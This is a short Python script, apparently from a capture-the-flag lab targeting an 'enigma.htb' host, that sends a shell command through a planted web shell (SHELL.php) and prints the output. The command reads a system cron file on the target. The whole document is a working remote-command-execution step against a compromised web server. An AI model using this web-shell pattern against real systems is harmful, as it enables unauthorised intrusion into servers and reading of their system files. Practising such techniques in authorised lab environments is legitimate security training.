import urllib.request, urllib.parse

url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": "cat /etc/cron.d/php 2>&1; echo END"})
headers = {"Host": "support_001.enigma.htb"}
req = urllib.request.Request(url, headers=headers)
try:
    resp = urllib.request.urlopen(req, timeout=10)
    result = resp.read().decode("utf-8", errors="replace").strip()
    print(repr(result[:1000]))
except Exception as e:
    print(f"Error: {e}")
